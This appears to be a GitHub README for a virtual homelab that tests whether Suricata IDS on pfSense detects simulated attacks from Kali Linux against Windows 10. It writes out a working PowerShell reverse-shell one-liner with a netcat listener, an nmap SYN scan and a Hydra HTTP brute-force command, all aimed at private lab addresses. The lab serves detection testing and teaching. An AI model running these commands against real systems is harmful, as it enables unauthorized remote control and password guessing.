# 🛡️ Cybersecurity Homelab: Suricata IDS + Reverse Shell Attack Simulation

![Status](https://img.shields.io/badge/status-completed-brightgreen)  
![Platform](https://img.shields.io/badge/platform-VirtualBox-blue)  
![Log Type](https://img.shields.io/badge/logs-Suricata%20Alerts-orange)

## 📘 Project Overview

This project demonstrates how to set up a virtualized cybersecurity homelab using **pfSense**, **Suricata IDS**, **Kali Linux**, and **Windows 10**. It simulates a real-world cyberattack involving a **reverse shell** and evaluates **Suricata's detection capability**.

---

## 🏗️ Lab Topology

![_- visual selection](https://github.com/user-attachments/assets/4f46f75e-951e-4bed-b097-f30b0ecb1534)


All machines are connected via **VirtualBox Internal Network (LAN_NET)**.

---

## 🔧 Technologies Used

- VirtualBox
- pfSense Firewall + Suricata IDS
- Kali Linux (Netcat, Nmap, Hydra)
- Windows 10 (PowerShell reverse shell)
- Emerging Threats Open Rules

---

## ⚙️ Step-by-Step Setup

### 1. Homelab Configuration
- Installed pfSense and configured LAN interface as `192.168.1.1`
- Installed Suricata on pfSense and enabled Alert-only mode on LAN
- Added **Kali (192.168.1.100)** and **Windows (192.168.1.101)** to LAN_NET

### 2. Rule Configuration
- Enabled decoder and stream rules by default
- Added `emerging-shellcode.rules`, `scan.rules`, and `http-events.rules`
- Suricata configured to alert on suspicious traffic

---

## 🧪 Simulated Attacks

### ✔️ Reverse Shell
- On Kali:
  nc -nvlp 4444


  On Windows PowerShell:
  $c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(iex $d 2>&1 | Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length)}



   Nmap Port Scan:
sudo nmap -sS 192.168.1.101

Hydra Brute Force (HTTP):
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.101 http-get



